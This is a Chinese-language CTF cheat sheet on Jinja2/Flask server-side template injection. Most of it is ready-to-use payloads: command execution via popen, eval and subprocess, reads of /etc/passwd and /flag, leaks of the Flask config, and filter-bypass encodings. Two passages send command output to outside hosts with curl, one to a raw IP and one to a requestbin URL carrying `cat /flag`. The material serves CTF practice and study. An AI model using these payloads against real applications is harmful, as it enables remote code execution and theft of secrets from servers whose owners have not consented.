# SSTI--Jinja2

# 前言

SSTI（服务端模板注入），已然不再是一个新话题，近年来的CTF中还是也经常能遇到的，比如护网杯的easy_tonado、TWCTF的Shrine，19年的SCTF也出了Ruby ERB SSTI的考点；

本篇对这部分总结一下，方便未来做题和复习的时候查阅！

# 简介

首先简单说一下什么是SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；
漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。

# 常用魔法函数

```
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__base__ 
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
__dict__ 查看对象内部所有属性名和属性值组成的字典
```



# 利用流程

> 获取基本类->获取基本类的子类->在子类中找到关于命令执行和文件读写的模块

当然我们通常是找到`buildtins`在下面的基础上去进行一些骚操作，还有`catch_warnings.__init__.__globals__`也比较常用

## 构造链的思路

### 构造链的发现

- 第一步

目的：使用`__class__`来获取内置类所对应的类

可以通过使用`str`，`list`，`tuple`，`dict`等来获取

```
>>> ''.__class__
<class 'str'>
>>> "".__class__
<class 'str'>
>>> [].__class__
<class 'list'>
>>> ().__class__
<class 'tuple'>
>>> {}.__class__
<class 'dict'>
>>>1.__class__
<class 'object'>
```

太多了就不一一举例了

- 第二步

目的：拿到`object`基类

用`__bases__[0]`拿到基类或者`__base__`

```
Python 3.9.1
>>> {}.__class__.__bases__[0]
<class 'object'>
>>> {}.__class__.__base__
<class 'object'>
```

用`__mro__[1]`或者`__mro__[-1]`拿到基类

```
Python 3.9.1
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[-1]
<class 'object'>
```

- 第三步

用`__subclasses__()`拿到子类列表

```
Python 3.9.1
>>> ''.__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'weakref'>,...]
```

- 第四步

在子类列表中找到可以加以利用的类

### 利用脚本帮助我们快速找到需要的模块

下面以python3为例，当然python2类似

```python
search = "popen"
num = -1
for i in ().__class__.__base__.__subclasses__():
	num += 1
	try:
		if search in i.__init__.__globals__.keys():
			print(i, num)
	except:
		pass
```

## Python当中的利用

### Python2当中的利用

tips：python2的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`

```
''.__class__.__bases__[0] <type 'basestring'>
''.__class__.__bases__[0].__bases__[0] <type 'object'>
```

- `file`类读写文件

本方法只能适用于python2，因为在python3中`file`类已经被移除了

```
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40] <type 'file'>

```

可以使用dir查看file对象中的内置方法

```
dir(''.__class__.__bases__[0].__bases__[0].__subclasses__()[40])

['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
```

然后直接调用里面的方法即可，payload如下

读文件

```
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/etc/passwd').read()
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()
```

- warnings`类中的`linecache

  本方法只能用于python2，因为在python3中会报错`'function object' has no attribute 'func_globals'`，不知道为啥
  
  ```
  (<class 'warnings.catch_warnings'>)
  # -*- coding: UTF-8 -*-
  print ().__class__.__bases__[0].__subclasses__()[-20].__init__.func_globals['linecache'].os.popen('whoami').read()
  ```
  

### 删除了很多模块，但是没有删除reload

```python
比如删除了__builtins__下的各种利用模块
reload(__builtins__)，重新加载被删除的模块，直接命令执行，只用于py2  
```

### python3当中的利用

- `os._wrap_close`类中的`popen`
- 通过上面给的脚本寻找`popen`所在

```
<class 'os._wrap_close'> 139
<class 'os._AddedDllDirectory'> 140

>>> "".__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['popen']('whoami').read()
'desktop-v7cteor\\y4tacker\n'
().__class__.__base__.__subclasses__()[140].__init__.__globals__['popen']('whoami').read()
```

- `__import__`

  ```
  <class '_frozen_importlib._ModuleLock'> 80
  <class '_frozen_importlib._DummyModuleLock'> 81
  <class '_frozen_importlib._ModuleLockManager'> 82
  <class '_frozen_importlib.ModuleSpec'> 83
  {{"".__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}
  
  ```

### Python2与Python3通杀

这里介绍python2和python3两个版本通用的方法

- `__builtins__`代码执行

这种方法是比较常用的，因为他两种python版本都适用

首先`__builtins__`是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如`abs`，`max`，就是因为`__builtins__`这类模块在Python启动时为我们导入了，可以使用`dir(__builtins__)`来查看调用方法的列表，然后可以发现`__builtins__`下有`eval`，`__import__`等的函数，因此可以利用此来执行命令。

经过简单Python3测试有比较多的类都含有`__builtins__`，比如常用的还有`email.header._ValueFormatter`等等，这也可能是为什么这种方法比较多人用的原因之一吧

```
<class '_frozen_importlib._ModuleLock'> 80
<class '_frozen_importlib._DummyModuleLock'> 81
<class '_frozen_importlib._ModuleLockManager'> 82
<class '_frozen_importlib.ModuleSpec'> 83
<class '_frozen_importlib_external.FileLoader'> 94
<class '_frozen_importlib_external._NamespacePath'> 95
<class '_frozen_importlib_external._NamespaceLoader'> 96
<class '_frozen_importlib_external.FileFinder'> 98
<class 'zipimport.zipimporter'> 105
<class 'zipimport._ZipImportResourceReader'> 106
<class 'codecs.IncrementalEncoder'> 108
<class 'codecs.IncrementalDecoder'> 109
<class 'codecs.StreamReaderWriter'> 110
<class 'codecs.StreamRecoder'> 111
<class 'os._wrap_close'> 134
<class 'os._AddedDllDirectory'> 135
<class '_sitebuiltins.Quitter'> 136
<class '_sitebuiltins._Printer'> 137
<class 'types.DynamicClassAttribute'> 144
<class 'types._GeneratorWrapper'> 145
<class 'warnings.WarningMessage'> 146
<class 'warnings.catch_warnings'> 147
<class 'reprlib.Repr'> 171
<class 'functools.partialmethod'> 179
<class 'functools.singledispatchmethod'> 180
<class 'functools.cached_property'> 181
<class 'contextlib._GeneratorContextManagerBase'> 183
<class 'contextlib._BaseExitStack'> 184
<class 'sre_parse.State'> 190
<class 'sre_parse.SubPattern'> 191
<class 'sre_parse.Tokenizer'> 192
<class 're.Scanner'> 193
<class 'tokenize.Untokenizer'> 207
<class 'traceback.FrameSummary'> 208
<class 'traceback.TracebackException'> 209
<class 'distutils.version.Version'> 210
<class 'dis.Bytecode'> 213
<class 'inspect.BlockFinder'> 214
<class 'inspect.Parameter'> 217
<class 'inspect.BoundArguments'> 218
<class 'inspect.Signature'> 219
<class '_weakrefset._IterationGuard'> 220
<class '_weakrefset.WeakSet'> 221
<class 'weakref.finalize'> 223
<class 'string.Template'> 224
<class 'threading._RLock'> 226
<class 'threading.Condition'> 227
<class 'threading.Semaphore'> 228
<class 'threading.Event'> 229
<class 'threading.Barrier'> 230
<class 'threading.Thread'> 231
<class 'logging.LogRecord'> 232
<class 'logging.PercentStyle'> 233
<class 'logging.Formatter'> 234
<class 'logging.BufferingFormatter'> 235
<class 'logging.Filter'> 236
<class 'logging.Filterer'> 237
<class 'logging.PlaceHolder'> 238
<class 'logging.Manager'> 239
<class 'logging.LoggerAdapter'> 240
<class 'pathlib._Flavour'> 244
<class 'pathlib._Selector'> 246
<class 'pprint._safe_key'> 249
<class 'pprint.PrettyPrinter'> 250
<class 'subprocess.STARTUPINFO'> 258
<class 'subprocess.CompletedProcess'> 259
<class 'subprocess.Popen'> 260
<class 'tempfile._TemporaryFileCloser'> 265
<class 'tempfile._TemporaryFileWrapper'> 266
<class 'tempfile.SpooledTemporaryFile'> 267
<class 'tempfile.TemporaryDirectory'> 268
<class 'gzip._PaddedFile'> 271
<class '__future__._Feature'> 273
<class 'ctypes.CDLL'> 281
<class 'ctypes.LibraryLoader'> 282
<class 'textwrap.TextWrapper'> 283
```

再调用`eval`等函数和方法即可，payload如下

```python
{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

又或者用如下两种方式，用模板来跑循环

```python
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
```

或

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

读取文件payload

```
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

然后这里再提一个比较少人提到的点

`warnings.catch_warnings`类在在内部定义了`_module=sys.modules['warnings']`，然后`warnings`模块包含有`__builtins__`，也就是说如果可以找到`warnings.catch_warnings`类，则可以不使用`globals`

```python
{{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
```

- subprocess.Popen

```
''.__class__.__mro__[1].__subclasses__()[260]('whoami',shell=True,stdout=-1).communicate()[0].strip()
```

- os

```
<class 'inspect.BlockFinder'> 214
<class 'inspect.Parameter'> 217
<class 'inspect.BoundArguments'> 218
<class 'inspect.Signature'> 219
<class 'logging.LogRecord'> 232
<class 'logging.PercentStyle'> 233
<class 'logging.Formatter'> 234
<class 'logging.BufferingFormatter'> 235
<class 'logging.Filter'> 236
<class 'logging.Filterer'> 237
<class 'logging.PlaceHolder'> 238
<class 'logging.Manager'> 239
<class 'logging.LoggerAdapter'> 240
<class 'pathlib._Flavour'> 244
<class 'pathlib._Selector'> 246
<class 'subprocess.STARTUPINFO'> 258
<class 'subprocess.CompletedProcess'> 259
<class 'subprocess.Popen'> 260
<class 'gzip._PaddedFile'> 271

().__class__.__base__.__subclasses__()[214].__init__.__globals__['os'].popen('whoami').read()
```

### 获取配置信息

我们有时候可以使用flask的内置函数比如说`url_for`，`get_flashed_messages`，甚至是内置的对象`request`来查询配置信息或者是构造payload

- `config`

我们通常会用`{{config}}`查询配置信息，如果题目有设置类似`app.config ['FLAG'] = os.environ.pop('FLAG')`，就可以直接访问`{{config['FLAG']}}`或者`{{config.FLAG}}`获得flag

但是如果被过滤了

```
{{self}} ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config
```



- `request`

jinja2中存在对象`request`

```
Python 3.9.1
>>> from flask import Flask,request,render_template_string
>>> request.__class__.__mro__[1]
<class 'object'>
```

查询一些配置信息

```python
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
```

- `url_for`

查询配置信息

```
{{url_for.__globals__['current_app'].config}}
```

- `get_flashed_messages`

查询配置信息

```
{{get_flashed_messages.__globals__['current_app'].config}}
```

当然也可以通过一些配置信息来构造payload

```
{{url_for.__globals__.__builtins__.eval('__import__("os").popen("cat app.py").read()')}}

{{config.__init__.__globals__. __builtins__.eval('__import__("os").popen("cat app.py").read()')}}
{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
```

- 最近发现还可以使用`__dict__`

  ```
  [].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls').read()
  ```

  

# 绕过黑名单过滤姿势总结

现在各大比赛都让你去绕过各种各样的黑名单，对网上资料做个总结与整合

## 前置知识

首先我认为在总结之前有必要对于前置知识做一定的了解

#### 语法

这是官方文档中关于模板的语法的介绍

```
{% ... %} for Statements 

{{ ... }} for Expressions to print to the template output

{# ... #} for Comments not included in the template output

#  ... # for Line Statements

```

```python
{%%} 用来声明变量，也可以用于循环语句和条件语句。
{{}}用于将表达式打印到模板输出
{##}表示未包含在模板输出中的注释
##可以有和{%%}相同的效果
{% set x= 'abcd' %}  声明变量
{% for i in ['a','b','c'] %}{{i}}{%endfor%} 循环语句
{% if 25==5*5 %}{{1}}{% endif %}  条件语句
此外在environment中配置line_statement_prefix后以下两条等价，app.jinja_env.line_statement_prefix="#"
 # for i in ['a','1']
{{ i }}
# endfor

{% for i in ['a','1'] %}
{{ item }}
{% endfor %}
```

#### 变量属性的获取

首先将方法列出来

```
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

下面开始讲解

##### `.`与`[]`

除了标准的python语法使用点`（.）`外，还可以使用中括号`（[]）`来访问变量的属性

```
{{"".__class__}}
{{""['__classs__']}}
```

**所以过滤了点，我们还可以用中括号绕过。**
如果想调用字典中的键值，其本质其实是调用了魔术方法`__getitem__`
**所以对于取字典中键值的情况不仅可以用`[]`，也可以用`__getitem__`**

##### 魔术方法`__getitem__`的使用

通常情况下，我们这样使用`字典.__builtins__`等价于下面这个语句

```
|attr('__getitem__')('__builtins__')
```

对于列表来说，我们通常使用`列表[177]`来获取其第177位元素

```python
|attr('__getitem__')(177)
除此以外，发现flask里面
[].__class__.__base__.__subclasses__()[189]
等价于
[].__class__.__base__.__subclasses__().189
```

##### 字典等自带的方法

###### pop

对于字典来说，我们也可以用他自带的一些方法了，比如pop

```
pop(key[,default])
参数
key: 要删除的键值
default: 如果没有 key，返回 default 值
删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。
```

**我们要使用字典中的键值的话，也可以用`list.pop("var")`**

下面是个简单的例子

```
>>> a= {'y4':1,'y5':2}
>>> a.pop('y4')
1
>>> a = [213,432,546,324]
>>> a.pop(3)
324
```

###### `dict.get`与`dict.setdefault`

```
dict.get(key, default=None)
返回指定键的值，如果值不在字典中返回default值

dict.setdefault(key, default=None)
和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default

```

例子：

```
>>> a= {'y4':1,'y5':2}
>>> a.get('y4')
1
>>> a.setdefault('y4')
1
>>>
```

#### 对象方法与属性的调用

##### 魔术方法`__getattribute__`

```
"".__class__
"".__getattribute__("__class__")
```

**如果题目过滤了class或者一些关键字，可以通过字符串处理进行拼接**

> `"__cla"+"ss__"`

```
小总结:
().__class__
()["__class__"]
()|attr("__class__")
().__getattribute__("__class__")
```



#### 字符串的处理

**1、拼接**
`"cla"+"ss"`
**2、反转**
`"__ssalc__"[::-1]`

实际上我发现其实加号是多余的，在jinjia2里面，`"cla""ss"`是等同于`"class"`的，也就是说我们可以这样引用class，并且绕过字符串过滤
**3、通过\_\_add\_\_**

```python
{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").pop'+'en("ls").read()')}}
{{[].__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__["open"]("/fl""ag").read()}}
{{app.__init__.__globals__["__buil".__add__("tins__")].open("/fla".__add__("g")).read()}}
```
**4、ascii转换**

```python
1.
"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
比如：
{{""['{0:c}'['format'](95)%2b'{0:c}'['format'](95)%2b'{0:c}'['format'](99)%2b'{0:c}'['format'](108)%2b'{0:c}'['format'](97)%2b'{0:c}'['format'](115)%2b'{0:c}'['format'](115)%2b'{0:c}'['format'](95)%2b'{0:c}'['format'](95)]}}
或者：
{{""["{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)]}}
得到<class 'str'>
2.
"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)=='__class__'
""["%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)]
```

**4、编码绕过**

```
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
比如：{{""['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']}}
对于python2的话，还可以利用base64进行绕过
"__class__"==("X19jbGFzc19f").decode("base64")
```

关于16进制我这里写个脚本，方便懒人吧

```
# 方法一：先通过ord()把字符转成ascii码的十进制，再通过hex（）转成16进制
# 方法二：先把字符串转成字节，再从字节转成16进制
# data="assgdfnjhgjgj"
# print(data.encode().hex())
target = "__class__"
final = ""
for item in target:
	# 0x5f转换为/x5f
    final += ("\\"+hex(ord(item))[1:])
print(final)
```

5.first与last

```python
"".__class__.__mro__|last()
相当于
"".__class__.__mro__[-1]

"".__class__.__mro__|first()
相当于
"".__class__.__mro__[0]
```

6.join

```
{{ [1, 2, 3]|join('|') }}
    -> 1|2|3

{{ [1, 2, 3]|join }}
    -> 123
It is also possible to join certain attributes of an object:

{{ users|join(', ', attribute='username') }}

""[['__clas','s__']|join] 或者 ""[('__clas','s__')|join]
相当于
""["__class__"]
```

7.lower

```
""["__CLASS__"|lower]
```

8.replace reverse

```
"__claee__"|replace("ee","ss") 构造出字符串 "__class__"
"__ssalc__"|reverse 构造出 "__class__"
```

9.string

功能类似于python内置函数 str
有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串

```
().__class__   出来的是<class 'tuple'>
(().__class__|string)[0] 出来的是<
```

10.select unique

这两个乍一看感觉没啥用处，其实如果我们和上面的结合就会发现他们巨大的用处

```
()|select|string
结果如下
<generator object select_or_reject at 0x0000022717FF33C0>

()|unique|string
结果如下
<generator object do_unique at 0x7f92be0fc5f0>
```

之后我们可以配合`~`去拼接我们想得到的东西

```
(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]

得到字符串"__class__"
```

11.list

```
(()|select|string)[0]
如果中括号被过滤了，挺难的
但是列表的话就可以用pop取下标了
当然都可以使用__getitem__
(()|select|string|list).pop(0)

```

#### 获取内置方法 以chr为例

```
"".__class__.__base__.__subclasses__()[x].__init__.__globals__['__builtins__'].chr
get_flashed_messages.__globals__['__builtins__'].chr
url_for.__globals__['__builtins__'].chr
lipsum.__globals__['__builtins__'].chr
x.__init__.__globals__['__builtins__'].chr  (x为任意值)

```

#### request获取参数

如果是在web环境下面则可以利用下面获取参数

```
request.args.x1   	get传参
request.values.x1 	post传参
request.cookies
request.form.x1   	post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		post传参	(Content-Type:a/b)
request.json		post传json  (Content-Type: application/json)

```

#### **在jinja2里面可以利用~进行拼接**

```
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
```



## 过滤`{{`或者`}}`

可以使用`{%`绕过
{%%}中间可以执行if语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果

```
python2
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://39.105.116.195:8080/?i=`whoami`').read()=='p' %}1{% endif %}
python3 上面前置知识都讲了
{% set po=dict(po=a,p=a)|join%} //pop
{% set a=(()|select|string|list)|attr(po)(24)%} //获取_
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} //获取__init__
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}  //获取__globals__
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} //获取__getitem__
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}  //获取__builtins__,后面不必多说了都懂得
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}
```

## 过滤了数字

1.过滤器暴力获取

```
{% set c=(dict(e=a)|join|count)%} //1
{% set cc=(dict(ee=a)|join|count)%} //2
```

过滤了count，可以用length替换

```
{% set c=(dict(e=a)|join|length)%} //1
{% set cc=(dict(ee=a)|join|length)%} //2
```

然后想要获取更大的就没必要写那么多字符了，累啊

```
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set coun=(cc~ccc)|int%}{%print(coun)%} //获取12
```

2.全角数字替代正常数字

```
def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)

```

## 过滤`_`

用编码绕过

```python
比如：__class__ => \x5f\x5fclass\x5f\x5f
```

当然也可以用上面说过的request绕过

```
request.args.x1   	get传参
request.values.x1 	post传参
request.cookies
request.form.x1   	post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		post传参	(Content-Type:a/b)
request.json		post传json  (Content-Type: application/json)
```

举一个简单的例子

例如`''.__class__`写成 '`'|attr(request['values']['x1'])`,然后post传入`x1=__class__`

## 过滤`.`或者`[]`

`.`在payload中是很重要的，但是我们依旧可以采用`attr()`或`[]`绕过

```
小总结:
().__class__
()["__class__"]
()|attr("__class__")
().__getattribute__("__class__") //获取属性
|attr('__getitem__')(177) //列表获取序号
"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)
或者flask支持
"".__class__.__mro__.2
{{x.__init__.__globals__.__getitem__("__builtins__")}} //也可以获取字典里面的键值对
```

## 关键字黑名单绕过

Flask在渲染模板的时候，有

> ```
> "".__class__`===`""["__class__"]
> ```

这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。
由于里面的内容已经是字符串了，还可以做一个这样的变形

> ```
> "".__class__`===`""["__cla"+"ss__"]
> ```

甚至不要加号具体可以参考我上面总结的字符串的处理，有很多不举例了

> {{""["__cla""ss__"]}}

## 帝王级绕过

慎用因为累，至于下面为什么cc对应1，ccc对应2是因为，如果获取到0的话那么，比如40就无法拼接，+1以后就可以`ccccc~c`

```
http://e27681b2-43cc-4698-a5d9-4e67729a27a5.chall.ctf.show/?name=http://c8f74fd3-a05a-477c-bb97-10325b9ce77d.chall.ctf.show?name=
{% set c=(t|count)%}
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eee=a)|join|count)%}
{% set ccccc=(dict(eeee=a)|join|count)%}
{% set cccccc=(dict(eeeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}
{% set ccccccccccccc=(dict(eeeeeeeeeeee=a)|join|count)%}
{% set cccccccccccccc=(dict(eeeeeeeeeeeee=a)|join|count)%}
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr((cccccccccc~cccccc)|int)%2bchr((cccccccccc~cccccc)|int)%2bchr((ccccccccccc~cccccc)|int)%2bchr((ccccccccccc~cccccccccc)|int)%2bchr((cccccccccccc~ccc)|int)%2bchr((cccccccccccc~cc)|int)%2bchr((cccccccccccc~ccccc)|int)%2bchr((cccccccccccc~ccccccc)|int)%2bchr((cccccccccc~cccccc)|int)%2bchr((cccccccccc~cccccc)|int)%2bchr((ccccc~c)|int)%2bchr((cccc~ccccc)|int)%2bchr((cccccccccccc~cc)|int)%2bchr((cccccccccccc~cccccc)|int)%2bchr((cccc~ccccc)|int)%2bchr((ccccc~cc)|int)%2bchr((ccccc~ccccccc)|int)%2bchr((cccccccccccc~ccc)|int)%2bchr((cccccccccccc~cc)|int)%2bchr((cccccccccccc~ccc)|int)%2bchr((ccccccccccc~cc)|int)%2bchr((cccccccccccc~c)|int)%2bchr((ccccc~c)|int)%2bchr((cccc~ccccc)|int)%2bchr((cccccccccc~cccccccccc)|int)%2bchr((cccccccccccc~cccccccc)|int)%2bchr((cccccccccccc~ccccc)|int)%2bchr((ccccccccccc~ccccccccc)|int)%2bchr((cccc~ccc)|int)%2bchr((ccccccccccc~ccccc)|int)%2bchr((cccccccccccc~ccccccc)|int)%2bchr((cccccccccccc~ccccccc)|int)%2bchr((cccccccccccc~ccc)|int)%2bchr((cccccc~ccccccccc)|int)%2bchr((ccccc~cccccccc)|int)%2bchr((ccccc~cccccccc)|int)%2bchr((cccccccccccc~ccccc)|int)%2bchr((ccccccccccc~cc)|int)%2bchr((cccccccccccc~cccc)|int)%2bchr((cccccccccccc~cccccccc)|int)%2bchr((ccccccccccc~cc)|int)%2bchr((cccccccccccc~cccccc)|int)%2bchr((cccccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccccccccc)|int)%2bchr((ccccccccccc~cccccc)|int)%2bchr((cccccccccccc~c)|int)%2bchr((ccccc~ccccccc)|int)%2bchr((cccccccccccc~c)|int)%2bchr((ccccccccccc~cc)|int)%2bchr((cccccccccccc~ccccccc)|int)%2bchr((ccccc~cccccccc)|int)%2bchr((cccccccccccc~ccccc)|int)%2bchr((ccccc~cccccccc)|int)%2bchr((ccccc~cccccccccc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((cccccccccccc~cc)|int)%2bchr((ccccc~cccccccccc)|int)%2bchr((ccccccccccc~cccc)|int)%2bchr((cccccccccccc~ccccc)|int)%2bchr((ccccccccccccc~ccc)|int)%2bchr((ccccc~cccccccccc)|int)%2bchr((ccccccc~cccc)|int)%2bchr((cccccccccccc~ccc)|int)%2bchr((ccccccc~cc)|int)%2bchr((cccccccccc~ccccccc)|int)%2bchr((cccccccccc~cccccccccc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((cccccccccccc~ccccccc)|int)%2bchr((cccc~ccc)|int)%2bchr((ccccc~cccccccc)|int)%2bchr((ccccccccccc~ccc)|int)%2bchr((ccccccccccc~ccccccccc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccccc~cccc)|int)%2bchr((cccccccccc~ccccccc)|int)%2bchr((cccc~ccccc)|int)%2bchr((ccccc~cc)|int)%2bchr((ccccc~ccccccc)|int)%2bchr((cccccccccccc~ccccc)|int)%2bchr((ccccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccccc~c)|int)%2bchr((ccccc~c)|int)%2bchr((ccccc~cc)|int)%}
{%if x.eval(cmd)%}
666
{%endif%}
```

至于上面cmd里面的内容的生成

```
def generateIt(t):
	t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'
	return t
s='__import__("os").popen("curl http://requestbin.net/r/wobh0ywo?p=`cat /flag`").read()'
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+generateIt(str(ord(s[i])))+')%2b'
		else:
			t+='chr('+generateIt(str(ord(s[i])))+')'
	return t
print(ccchr(s))
```



# 参考资料

作为 web层面的攻击,我们要关注语言层面的特性和绕过，在Flask/Jinja2 模板的语法,filters和内建函数,变量,都可能称为绕过的trick

[Jinja官方文档](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters)

[Flask官方文档](https://dormousehole.readthedocs.io/en/latest/)

[SSTI模板注入及绕过姿势(基于Python-Jinja2)](https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%7B%22request%5Fid%22%3A%22160992724816780274016446%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160992724816780274016446&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450)

[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)

[一篇文章带你理解漏洞之 SSTI 漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/)

